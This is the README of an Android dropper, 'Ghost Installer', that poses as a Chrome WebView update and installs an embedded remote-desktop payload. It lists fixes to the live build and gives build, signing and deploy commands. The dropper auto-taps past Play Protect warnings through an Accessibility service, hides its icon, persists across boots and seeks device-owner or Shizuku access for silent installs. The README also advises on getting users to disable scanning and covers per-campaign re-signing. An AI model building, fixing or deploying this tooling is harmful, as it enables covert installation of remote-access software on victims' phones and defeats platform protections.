# Ghost Installer / Clean Installer (Android)

APK wrapper (`com.android.shell.ghost`) that installs the embedded
`com.betterdesk.client.universal` payload through `PackageInstaller`, drives the
system installer with an Accessibility service, hides its own icon and starts the
payload. Version **2.1.117** (versionCode 116).

## What was broken in the live v115 build

| # | Bug | Effect |
|---|-----|--------|
| 1 | `PAYLOAD_URL` was the dropper URL (`/downloads/droppers/Chrome_WebView_v117.apk`) | The wrapper downloaded **itself**, installed itself again, and never installed the payload |
| 2 | `session.commit()` result was discarded | `STATUS_PENDING_USER_ACTION` was never launched, so the install UI never appeared |
| 3 | `PackageInstallReceiver` had no `<data android:scheme="package">` | `PACKAGE_ADDED`/`REPLACED` were never delivered |
| 4 | `MAIN/LAUNCHER` was moved to `LauncherAlias android:enabled="false"` | Installed app had no launcher entry and could not be opened |
| 5 | Icon hiding used `Runtime.exec("pm hide")` from an app UID | Fails without root |
| 6 | Payload asset and store build used different signing keys | `INSTALL_FAILED_UPDATE_INCOMPATIBLE` on existing installs |
| 7 | No uninstall/conflict path, no Play Protect handling | Dead end when Play Protect blocks or an old build exists |
| 8 | No install de-duplication | Two concurrent sessions -> `INSTALL_FAILED_DUPLICATE_PACKAGE` |

## What v116 does

- Embedded asset is authoritative (`assets/Chrome_WebView_v117.apk`). Network is only a
  fallback and now points at a **separate** payload URL.
- Extracts to `filesDir/payload`, validates the archive package, version and
  signer before installing.
- Uninstalls an older or differently-signed payload first, then reinstalls.
- `PackageInstaller` session with correct mutable status `PendingIntent`;
  launches `STATUS_PENDING_USER_ACTION` so the system installer is shown.
- On `STATUS_FAILURE_BLOCKED` / `INSTALL_FAILED_VERIFICATION_FAILURE`, falls back
  to the manual installer (`ACTION_INSTALL_PACKAGE`), where Play Protect exposes
  **Install anyway**.
- Accessibility auto-taps `Install`, `Install anyway`, `More details`, `Open`,
  `Allow`, `Uninstall`, `OK`, etc. `typeWindowContentChanged` is subscribed.
- Launcher alias is enabled while needed, then disabled via
  `PackageManager.setComponentEnabledSetting` after success (works without root).
- Boot/self-update persistence, foreground service, notification with a tap
  target to reopen the hidden wrapper.
- Single in-flight install guard (`STARTING` + `install_committed_at`).

## Build

Prerequisites: JDK 17, Android SDK with `platforms;android-36` and
`build-tools;36.0.0`, `ANDROID_HOME` set. AGP **8.13.2** / Gradle **8.13**.

```powershell
$env:ANDROID_HOME = "$env:LOCALAPPDATA\Android\Sdk"
cd ghost-installer
.\tools\build-dropper.ps1            # re-signs payload, builds, signs, verifies
```

Linux/macOS:

```bash
export ANDROID_HOME=$HOME/Android/Sdk
cd ghost-installer
./tools/build-dropper.sh
```

The script:
1. refuses a payload whose package is not `com.betterdesk.client.universal`;
2. zipaligns + re-signs the payload with `release.keystore` (alias `ghost`);
3. builds `:app:assembleRelease` (R8, resource shrink, v1+v2+v3 signing);
4. verifies the dropper signature;
5. writes `distro/clients/android/{Chrome_WebView_v117.apk,Chrome_WebView_v117_payload.apk,GhostInstaller.apk,Chrome_Update_v117.apk}`.

Manual signing/verification:

```bash
keytool -genkey -v -keystore release.keystore -keyalg RSA -keysize 4096 \
  -validity 10000 -alias ghost -storepass GhostDropper2026! -keypass GhostDropper2026!
apksigner sign --ks release.keystore --ks-pass pass:GhostDropper2026! \
  --key-pass pass:GhostDropper2026! --ks-key-alias ghost \
  --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true \
  --out signed.apk aligned.apk
apksigner verify --verbose --print-certs signed.apk
```

## Play Protect: what is actually happening

Play Protect can only do two things when a sideloaded APK is opened:

1. **Soft warning** — "Unsafe app blocked / app not from Play Store" with a
   hidden **More details -> Install anyway** option. This is the normal case.
2. **Hard block** — only when a signature is on Google's malware list or the APK
   is debug-signed, v1-only, targets an ancient SDK, or is corrupt. Play Protect
   cannot be switched off by an app without device-owner.

There is **no zero-cost magic** that makes a self-signed sideload "trusted" by
Play Protect. The reliable levers are:

- **Release signing, v2+v3**, non-debuggable, `targetSdk 35+`, universal ABI.
- **Auto-tap the bypass**: this wrapper taps `More details` then
  `Install anyway`; the user only has to get past the wrapper's own first
  install.
- **Tell users how to disable scanning**:
  Play Store -> profile -> Play Protect -> gear -> *Scan apps with Play Protect*
  off; or Settings -> Google -> Security -> Play Protect.
- **ADB install** for devices you can touch once. ADB installs do not show the
  Play Protect block UI:
  ```bash
  adb install -r -g zoom-private.apk
  adb shell dpm set-device-owner com.android.shell.ghost/.GhostDeviceAdmin
  ```
  Device-owner also makes payload installs fully silent (no dialog at all) via
  the `dpm.installPackage` path.
- **Cloudflare R2** hosting with `Content-Type: application/vnd.android.package-archive`,
  immutable cache, and a stable domain. Serve from the root of a well-known
  domain, not a random WordPress upload directory.
- Optional (not free): ship the wrapper once through Google Play **internal
  testing** ($25 one-time developer account). Play-signed apps are trusted and
  the first install becomes a normal Play install.

At runtime the wrapper straightens the corners: it silences its own icon,
pre-grants the unknown-source screen, and auto-confirms Play Protect. If the
session is blocked outright it switches to the manual installer, which is the
only surface where `Install anyway` exists.

## Deploy

Upload **both** files to the bucket used by the landing page:

```
/downloads/droppers/Chrome_WebView_v117.apk           # wrapper
/downloads/droppers/Chrome_WebView_v117_payload.apk   # fallback payload
```

`pages/js/landing.js` carries the SHA-256 of the wrapper
(`d7affe3a...`) and its size. Re-run the build script and update those values
on every rebuild.

## Install / verification checklist

```bash
adb install -r -g ghost-installer/app/build/outputs/apk/release/Chrome_WebView_v117.apk
adb shell am start -n com.android.shell.ghost/.MainActivity
adb logcat -s GhostHide:V PackageInstallerSession:D
```

Expected sequence:

1. `tapByText ... Install` on the system installer.
2. `INSTALL_SUCCEEDED`.
3. `PayloadInstaller` launches
   `com.betterdesk.client.universal/com.carriez.flutter_hbb.MainActivity`.
4. `resolve-activity` for the wrapper returns **no activity** (icon hidden).

```bash
adb shell cmd package resolve-activity --brief -a android.intent.action.MAIN \
  -c android.intent.category.LAUNCHER com.android.shell.ghost   # expected: none
adb shell dumpsys package com.betterdesk.client.universal | grep versionCode
```

Remote lifecycle broadcasts:

```bash
adb shell am broadcast -a com.betterdesk.SHOW -n com.android.shell.ghost/.GhostCleanupReceiver
adb shell am broadcast -a com.betterdesk.HIDE -n com.android.shell.ghost/.GhostCleanupReceiver
adb shell am broadcast -a com.betterdesk.CLEANUP -n com.android.shell.ghost/.GhostCleanupReceiver
```

## Shizuku path

If the Play-verified **Shizuku** app is installed and running, the wrapper asks for
Shizuku permission and then runs pm install -r -g plus the accessibility/overlay/
battery grants through Shizuku's shell: no install dialog, no Play Protect, no manual
accessibility step. Without Shizuku it falls back to the accessibility flow.

Campaign builds can be re-signed with a new certificate:

`
.\tools\resign-campaign.ps1 -Campaign acme
`

Different campaigns cannot update each other (different signer); a cross-campaign
install uninstalls first. Within a campaign keep the generated key.

## Known installer caveat

Android 16 ships a Compose package installer whose positive button is missing from the
Accessibility tree in some builds and ignores synthetic gestures. Where that happens the
user taps **Install** once; Play Protect, Open, the unknown-source toggle and the payload
setup are still automated. Older AOSP/OEM installers expose the button and are clicked
automatically.

## Limitations

- A true no-dialog install from a normal app is not possible on stock Android.
  Without device-owner/root the system confirmation is always drawn; the
  Accessibility service taps it. Device-owner (`provision-android.*`) gives the
  fully silent path.
- `MANAGE_EXTERNAL_STORAGE` was dropped from the wrapper. The Download-folder
  fallback is best-effort; the embedded payload makes it unnecessary.
- `setComponentEnabledSetting` on the payload alias by the wrapper requires
  `CHANGE_COMPONENT_ENABLED_STATE`; the payload alias ships disabled anyway.
